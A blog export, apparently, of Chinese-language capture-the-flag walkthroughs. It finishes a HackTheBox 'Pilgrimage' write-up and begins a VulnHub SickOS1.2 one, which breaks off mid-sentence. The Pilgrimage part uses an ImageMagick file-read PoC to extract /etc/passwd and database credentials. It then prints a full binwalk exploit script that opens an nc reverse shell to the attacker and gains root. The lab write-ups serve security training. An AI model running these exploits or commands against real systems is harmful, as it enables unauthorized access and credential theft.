/var/www/pilgrimage.htb/tmp/&quot; . $upload-&gt;getName() . $mime . &quot; -resize 50% /var/www/pilgrimage.htb/shrunk/&quot; . $newname . $mime);，网站服务用的是magick将图片缩小一半。刚好magick被我们下载下来了，我们直接看看magick的版本。\n此外，除了使用的服务，它还贴心的告诉我们网站连接的数据的位置$db = new PDO(&#39;sqlite:/var/db/pilgrimage&#39;);。那我们之后肯定要想办法看看，说不定能获得用户的复用的登录凭证。\n┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage.htb]└─$ ./magick -versionVersion: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.orgCopyright: (C) 1999 ImageMagick Studio LLCLicense: https://imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlibCompiler: gcc (7.5)\n\n我们可以看到版本是ImageMagick 7.1.0-49，在exp-db搜一下是不是有可用的漏洞。发现确实有https://github.com/voidz0r/CVE-2022-44268。\nMagick任意文件读取漏洞验证PoC此版本的magick存在任意文件读取的漏洞，PoC也介绍的很详细，我们尝试复现一下看看能不能成功利用这个PoC。\n\ngit clone https://github.com/voidz0r/CVE-2022-44268\n\ncargo run &quot;/etc/passwd&quot;\n\n此时会生成一张图片，我们直接把这张图片上传到目标网站，并把返回的图片下载下来。\n\n然后我们就可以分析返回的图片了\n┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ identify -verbose output.pngImage: output.png  Format: PNG (Portable Network Graphics)  Geometry: 100x100  Class: PseudoClass  Type: palette  Depth: 1 bits-per-pixel component  Channel Depths:    Red:      1 bits    Green:    1 bits    Blue:     1 bits  Channel Statistics:    Red:      Minimum:                 65535.00 (1.0000)      Maximum:                 65535.00 (1.0000)      Mean:                    65535.00 (1.0000)      Standard Deviation:          0.00 (0.0000)    Green:      Minimum:                     0.00 (0.0000)      Maximum:                     0.00 (0.0000)      Mean:                        0.00 (0.0000)      Standard Deviation:          0.00 (0.0000)    Blue:      Minimum:                     0.00 (0.0000)      Maximum:                     0.00 (0.0000)      Mean:                        0.00 (0.0000)      Standard Deviation:          0.00 (0.0000)  Colors: 2    0: (255,  0,  0)      red    1: (255,255,255)      white  Gamma: 0.45455  Chromaticity:    red primary: (0.64,0.33)    green primary: (0.3,0.6)    blue primary: (0.15,0.06)    white point: (0.3127,0.329)  Filesize: 1.1Ki  Interlace: No  Orientation: Unknown  Background Color: #FEFEFE  Border Color: #DFDFDF  Matte Color: #BDBDBD  Page geometry: 100x100+0+0  Compose: Over  Dispose: Undefined  Iterations: 0  Compression: Zip  Png:IHDR.color-type-orig: 3  Png:IHDR.bit-depth-orig: 1  Raw profile type:     1437726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a  Date:create: 2023-07-11T12:39:40+00:00  Date:modify: 2023-07-11T12:39:40+00:00  Date:timestamp: 2023-07-11T12:39:40+00:00  Signature: c7d03a3453434db9720fd67b559185125d9bdb1fe9c25c182783170e2ba6a8f6  Tainted: False  Elapsed Time: 0m:0.001572s  Pixels Per Second: 6.1Mi\n\n按照说明将其中的16进制数转换成字符看看结果\n┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ python3 -c &#x27;print(bytes.fromhex(&quot;那一串hex数据&quot;))&#x27;b&#x27;root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\\n_laurel:x:998:998::/var/log/laurel:/bin/false\\n&#x27;\n\n成功利用!\n\n\n通过读取&#x2F;etc&#x2F;passwd我们不仅验证了漏洞的存在，还发现了系统中的一个用户emily。那接下来就是想办法搞到emily的密码。\n当然首先想试试能不能直接读取shadow文件偷鸡，发现并不行。那只能寄希望于之前发现的数据库中能给我们点有用的信息了。\n读数据库步骤同上，就是把第二步改成cargo run &quot;/var/db/pilgrimage&quot;，再重复上面的步骤。当然第5步还是要改一改的。因为sqlite识别数据库文件需要是二进制的，所以我们给他转成二进制。这可以直接用linux自带的xxd实现（xxd -r -ps ）。\n┌──(kali㉿kali)-[~/HTB/Pilgrimage] #返回的数据太长了，存在文件里方便处理└─$ identify -verbose sql.png &gt; sql                                                         ┌──(kali㉿kali)-[~/HTB/Pilgrimage] #删掉除了16进制数据以外的其他东西└─$ vim sql┌──(kali㉿kali)-[~/HTB/Pilgrimage] #把数据转成二进制 r是hex转bin，ps表示以纯16进制转储└─$ xxd -r -ps sql sql.db\n\n数据处理完了，我们把它丢进sqlite3查看。\n┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ sqlite3 sql.dbSQLite version 3.40.1 2022-12-28 14:03:47Enter &quot;.help&quot; for usage hints.sqlite&gt; .databasesmain: /home/kali/HTB/Pilgrimage/sql.db r/wsqlite&gt; .tableimages  users sqlite&gt; select * from users   ...&gt; ;emily|abigchonkyboi123asd|asdtoto|totosqlite&gt; .exit\n\n发现users表中刚好有emily的密码，那我们肯定得试试能不能ssh登录系统。\n获取立足点┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage.htb]└─$ ssh emily@10.10.11.219emily@10.10.11.219&#x27;s password: Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.emily@pilgrimage:~$ \n\n成功登录，emily的home目录下就有可以拿到user flag。\n提权三板斧上来先sudo -l ，没权限。找一找SUID文件，没发现。看一看crontab，没东西。得了，啥也没有。\n手动浏览四处查看，也没有看到什么特别的东西。\n自动枚举那只能上大招了，把linpeas.sh传上去看看结果。\n╔══════════╣ Checking sudo tokens╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                      ptrace protection is disabled (0), so sudo tokens could be abused         Current user has other interactive shells running    680 /bin/bash /usr/sbin/malwarescan.sh    748 /bin/bash /usr/sbin/malwarescan.sh   1420 /bin/sh ./linpeas.sh\n\n其他没啥特别的，但是这一段值得我们看一下。首先我们查一下他这里说的sudo tokens有没有什么利用方案。查了一下发现背景是同一用户，不知道密码的情况，另一个终端15分钟内输入过sudo密码，当前终端就可以不用密码执行sudo命令。我们ps aux看了一下，发现malwarescan.sh是root用户运行的，并不能用到这个利用方式。\n虽然没能利用，但是毕竟malwarescan.sh是root运行的一个shell脚本，我们去看看他的内容有没有什么可以利用来提权的点。\nemily@pilgrimage:/usr/sbin$ cat malwarescan.sh #!/bin/bashblacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;)/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do        filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e &#x27;s/^.*CREATE //p&#x27;)&quot;        binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot;        for banned in &quot;$&#123;blacklist[@]&#125;&quot;; do                if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then                        /usr/bin/rm &quot;$filename&quot;                        break                fi        donedone\n\n内容很符合脚本名字，扫描文件，发现黑名单中的类型就删掉。\n我们发现脚本中的二进制文件都很严谨的写了绝对路径，想利用PATH偷鸡的想法是走不通了。那这些二进制文件是否会存在漏洞可以供我们利用？一个看看吧，inotifywait主要是用来监控文件的，这里持续监控（-m）/var/www/pilgrimage.htb/shrunk/下文件的创建。查了一下没发现可以用来提权的方法。echo，tail和sed就不用看了。那最好只能看看binwalk有什么说法了，没有的话就要想想别的办法了。\n我们先看看binwalk的版本。\nemily@pilgrimage:/usr/sbin$ /usr/local/bin/binwalk -hBinwalk v2.3.2Craig Heffner, ReFirmLabshttps://github.com/ReFirmLabs/binwalkUsage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...\n\nbinwalk提权在exp-db上搜发现这个版本的binwalk确实存在RCE漏洞。\n┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage.htb]└─$ searchsploit binwalk 2.3.2----------------------------------------------------------- --------------------------------- Exploit Title                                             |  Path----------------------------------------------------------- ---------------------------------Binwalk v2.3.2 - Remote Command Execution (RCE)            | python/remote/51249.py----------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\n搜了一下漏洞的成因是binwalk解析PFS文件时的防路径穿越代码存在问题，导致攻击者可以构造恶意文件直接进行路径穿越。当使用binwalk的-e选项对该恶意文件进行自动提取时，将触发漏洞，将攻击者构造的恶意文件中内嵌的文件写入提取目录之外的路径。这还可以导致远程代码执行。\n将漏洞利用脚本下载下来看看。\n┌──(kali㉿kali)-[~/Tools/AutoEnum]└─$ cat 51249.py       # Exploit Title: Binwalk v2.3.2 - Remote Command Execution (RCE)# Exploit Author: Etienne Lacoche# CVE-ID: CVE-2022-4510import osimport inspectimport argparseprint(&quot;&quot;)print(&quot;################################################&quot;)print(&quot;------------------CVE-2022-4510----------------&quot;)print(&quot;################################################&quot;)print(&quot;--------Binwalk Remote Command Execution--------&quot;)print(&quot;------Binwalk 2.1.2b through 2.3.2 included-----&quot;)print(&quot;------------------------------------------------&quot;)print(&quot;################################################&quot;)print(&quot;----------Exploit by: Etienne Lacoche-----------&quot;)print(&quot;---------Contact Twitter: @electr0sm0g----------&quot;)print(&quot;------------------Discovered by:----------------&quot;)print(&quot;---------Q. Kaiser, ONEKEY Research Lab---------&quot;)print(&quot;---------Exploit tested on debian 11------------&quot;)print(&quot;################################################&quot;)print(&quot;&quot;)parser = argparse.ArgumentParser()parser.add_argument(&quot;file&quot;, help=&quot;Path to input .png file&quot;,default=1)parser.add_argument(&quot;ip&quot;, help=&quot;Ip to nc listener&quot;,default=1)parser.add_argument(&quot;port&quot;, help=&quot;Port to nc listener&quot;,default=1)args = parser.parse_args()if args.file and args.ip and args.port:    header_pfs = bytes.fromhex(&quot;5046532f302e390000000000000001002e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e70790000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000034120000a0000000c100002e&quot;)    lines = [&#x27;import binwalk.core.plugin\\n&#x27;,&#x27;import os\\n&#x27;, &#x27;import shutil\\n&#x27;,&#x27;class MaliciousExtractor(binwalk.core.plugin.Plugin):\\n&#x27;,&#x27;    def init(self):\\n&#x27;,&#x27;        if not os.path.exists(&quot;/tmp/.binwalk&quot;):\\n&#x27;,&#x27;            os.system(&quot;nc &#x27;,str(args.ip)+&#x27; &#x27;,str(args.port)+&#x27; &#x27;,&#x27;-e /bin/bash 2&gt;/dev/null &amp;&quot;)\\n&#x27;,&#x27;            with open(&quot;/tmp/.binwalk&quot;, &quot;w&quot;) as f:\\n&#x27;,&#x27;                f.write(&quot;1&quot;)\\n&#x27;,&#x27;        else:\\n&#x27;,&#x27;            os.remove(&quot;/tmp/.binwalk&quot;)\\n&#x27;, &#x27;            os.remove(os.path.abspath(__file__))\\n&#x27;,&#x27;            shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), &quot;__pycache__&quot;))\\n&#x27;]    in_file = open(args.file, &quot;rb&quot;)    data = in_file.read()    in_file.close()    with open(&quot;/tmp/plugin&quot;, &quot;w&quot;) as f:       for line in lines:          f.write(line)    with open(&quot;/tmp/plugin&quot;, &quot;rb&quot;) as f:        content = f.read()    os.system(&quot;rm /tmp/plugin&quot;)    with open(&quot;binwalk_exploit.png&quot;, &quot;wb&quot;) as f:        f.write(data)        f.write(header_pfs)        f.write(content)    print(&quot;&quot;)    print(&quot;You can now rename and share binwalk_exploit and start your local netcat listener.&quot;)    print(&quot;&quot;) \n\n我们执行一下，在图片中嵌入漏洞利用的PFS。\n┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ python3 51249.py lena.png &lt;HTB_VPN_IP&gt; 443################################################------------------CVE-2022-4510----------------################################################--------Binwalk Remote Command Execution--------------Binwalk 2.1.2b through 2.3.2 included-----------------------------------------------------################################################----------Exploit by: Etienne Lacoche--------------------Contact Twitter: @electr0sm0g----------------------------Discovered by:-------------------------Q. Kaiser, ONEKEY Research Lab------------------Exploit tested on debian 11------------################################################You can now rename and share binwalk_exploit and start your local netcat listener.\n\n然后我们把文件传上去，直接传到/var/www/pilgrimage.htb/shrunk/可能脚本不会执行，不过我们复制过去的话就可以触发。\n本地开个nc监听\n┌──(kali㉿kali)-[~/HTB/Pilgrimage]└─$ nc -nlvp 443listening on [any] 443 ...connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.219] 60606whoamirootiduid=0(root) gid=0(root) groups=0(root)ls -latotal 12drwxr-xr-x 3 root root 4096 Jul 12 17:24 .drwx------ 5 root root 4096 Jun  8 00:10 ..drwxr-xr-x 3 root root 4096 Jul 12 17:24 _exp.png.extractedpwd/root/quarantinecd ..ls -latotal 40drwx------  5 root root 4096 Jun  8 00:10 .drwxr-xr-x 18 root root 4096 Jun  8 00:10 ..lrwxrwxrwx  1 root root    9 Feb 10 13:43 .bash_history -&gt; /dev/null-rw-r--r--  1 root root  571 Apr 11  2021 .bashrcdrwxr-xr-x  3 root root 4096 Jun  8 00:10 .config-rw-r--r--  1 root root   93 Jun  7 20:11 .gitconfigdrwxr-xr-x  3 root root 4096 Jun  8 00:10 .local-rw-r--r--  1 root root  161 Jul  9  2019 .profiledrwxr-xr-x  3 root root 4096 Jul 12 17:24 quarantine-rwxr-xr-x  1 root root  352 Jun  1 19:13 reset.sh-rw-r-----  1 root root   33 Jul 12 15:37 root.txtcat root.txt\n\n拿下。root目录下有root flag。\n总结这台机子主要考察git源代码泄露的信息收集，对应服务漏洞的发现与利用，以及提权部分对可疑文件的分析与提权思路构建。总体来说还是要提高姿势水平，才能轻松应对。\n","categories":["HackTheBox"],"tags":["walkthrough"]},{"title":"[vulnhub]  SickOS1.2","url":"/2023/05/24/SickOS1.2/","content":"\n\n\n信息收集nmapHost detection\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sn 192.168.56.0/24[sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:28 EDTNmap scan report for 192.168.56.1Host is up (0.00026s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.56.2Host is up (0.00014s latency).MAC Address: 00:50:56:EC:CE:9E (VMware)Nmap scan report for 192.168.56.136Host is up (0.00012s latency).MAC Address: 00:0C:29:F7:DE:A9 (VMware)Nmap scan report for 192.168.56.254Host is up (0.00083s latency).MAC Address: 00:50:56:E2:96:B0 (VMware)Nmap scan report for 192.168.56.132Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 2.09 seconds\n\nPort scan\n┌──(kali㉿kali)-[~]└─$ sudo nmap -p- --min-rate=10000 192.168.56.136        Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:31 EDTNmap scan report for 192.168.56.136Host is up (0.0012s latency).Not shown: 65533 filtered tcp ports (no-response)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpMAC Address: 00:0C:29:F7:DE:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds\n\n只开了22,80两个端口，攻击面有点小。\nTCP Service OS\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sT -sV -O -p22,80 192.168.56.136 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:32 EDTNmap scan report for 192.168.56.136Host is up (0.00093s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)80/tcp open  http    lighttpd 1.4.28MAC Address: 00:0C:29:F7:DE:A9 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.75 seconds\n\n80端口运行的lighttpd服务版本是1.4.28，其他没啥信息了。\nUDP\n┌──(kali㉿kali)-[~]└─$ sudo nmap -sU 192.168.56.136Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:35 EDTNmap scan report for 192.168.56.136Host is up (0.00056s latency).All 1000 scanned ports on 192.168.56.136 are in ignored states.Not shown: 1000 open|filtered udp ports (no-response)MAC Address: 00:0C:29:F7:DE:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 21.73 seconds\n\n过。\nVuln scan\n┌──(kali㉿kali)-[~]└─$ sudo nmap --script=vuln 192.168.56.136 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 11:36 EDTNmap scan report for 192.168.56.136Host is up (0.0017s latency). Not shown: 998 filtered tcp ports (no-response)  PORT   STATE SERVICE     22/tcp open  ssh  80/tcp open  http |_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities. |_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-slowloris-check:                |   VULNERABLE:              |   Slowloris DOS attack                |     State: LIKELY VULNERABLE |     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_      http://ha.ckers.org/slowloris/| http-enum: |_  /test/: Test page|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.MAC Address: 00:0C:29:F7:DE:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 87.09 seconds\n\n只有一个可能存在的DOS漏洞，没啥帮助。\nvuln search\n┌──(kali㉿kali)-[~]└─$ searchsploit lighttpd 1.4   -------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                |  Path-------------------------------------------------------------------------------------------------------------- ---------------------------------lighttpd - Denial of Service (PoC)                                                                            | linux/dos/18295.txtLighttpd 1.4.15 - Multiple Code Execution / Denial of Service / Information Disclosure Vulnerabilities        | windows/remote/30322.rbLighttpd 1.4.16 - FastCGI Header Overflow Remote Command Execution                                            | multiple/remote/4391.cLighttpd 1.4.17 - FastCGI Header Overflow Arbitrary Code Execution                                            | linux/remote/4437.clighttpd 1.4.31 - Denial of Service (PoC)                                                                     | linux/dos/22902.shLighttpd 1.4.x - mod_userdir Information Disclosure                                                           | linux/remote/31396.txtlighttpd 1.4/1.5 - Slow Request Handling Remote Denial of Service                                             | linux/dos/33591.shLighttpd &lt; 1.4.23 (BSD/Solaris) - Source Code Disclosure                                                      | multiple/remote/8786.txt-------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\n在exp-db也没找到 lighttpd 1.4.28可以用的漏洞\nniktonmap没扫出什么信息，试试nikto。\n┌──(kali㉿kali)-[~]└─$ sudo nikto -h 192.168.56.136                                     - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          192.168.56.136+ Target Hostname:    192.168.56.136+ Target Port:        80+ Start Time:         2023-04-19 11:40:45 (GMT-4)---------------------------------------------------------------------------+ Server: lighttpd/1.4.28+ /: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21.+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184+ /test/: Directory indexing found.+ /test/: This might be interesting.+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host+ End Time:           2023-04-19 11:41:11 (GMT-4) (26 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n只发现了一个/test目录。其他没啥信息。\nWeb fingerprint┌──(kali㉿kali)-[~]└─$ whatweb 192.168.56.136http://192.168.56.136 [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.28], IP[192.168.56.136], PHP[5.3.10-1ubuntu3.21], X-Powered-By[PHP/5.3.10-1ubuntu3.21], lighttpd[1.4.28]\n\n网页后端是php写的。\nweb先开网页看一眼吧\n\n确实。但是没信息了。\n看看/test吧。\n\n发现目录是空的，啥也没有。\n得。先目录扫描一下看看有没有其他目录吧。\n┌──(kali㉿kali)-[~]└─$ sudo gobuster dir -u http://192.168.56.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                   ===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://192.168.56.136[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.5[+] Timeout:                 10s===============================================================2023/04/20 08:19:00 Starting gobuster in directory enumeration mode===============================================================/test                 (Status: 301) [Size: 0] [--&gt; http://192.168.56.136/test/]/%7Echeckout%7E       (Status: 403) [Size: 345]Progress: 220251 / 220561 (99.86%)===============================================================2023/04/20 08:19:59 Finished===============================================================\n\n无敌了，啥也没有。只有个/test以及根目录/。（checkou也没东西，别看了）\n想办法从这两个目录下手吧。\nbing搜了一下还有什么别的信息收集方法，发现个基于OWSAP的web安全测试手册里面提到了验证网页支持的所有HTTP方法。除了常见的POST和GET方法，如果我们能使用PUT，将能实现任意文件上传。我们可以在请求中使用OPTIONS方法查看页面支持的HTTP方法。\ncurl的实现：curl -X OPTIONS &lt;ip&gt;, -X指定HTTP方法。\n┌──(kali㉿kali)-[~]└─$ sudo curl -v -X OPTIONS 192.168.56.136*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; OPTIONS / HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 200 OK&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21&lt; Content-type: text/html&lt; Transfer-Encoding: chunked&lt; Date: Wed, 19 Apr 2023 16:43:58 GMT&lt; Server: lighttpd/1.4.28&lt; &lt;html&gt;&lt;img src=&quot;blow.jpg&quot;&gt;&lt;/html&gt;&lt;!-- NOTHING IN HERE ///\\\\\\ --&gt;&gt;&gt;&gt;* Connection #0 to host 192.168.56.136 left intact\n\n可以看到根目录下不支持什么别的方法。\n看看/test的:\n┌──(kali㉿kali)-[~]└─$ sudo curl -v -X OPTIONS 192.168.56.136/test*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; OPTIONS /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 301 Moved Permanently&lt; DAV: 1,2&lt; MS-Author-Via: DAV&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK&lt; Location: http://192.168.56.136/test/&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 16:50:42 GMT&lt; Server: lighttpd/1.4.28&lt; * Connection #0 to host 192.168.56.136 left intact\n\n我们发现&#x2F;test目录下支持PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, 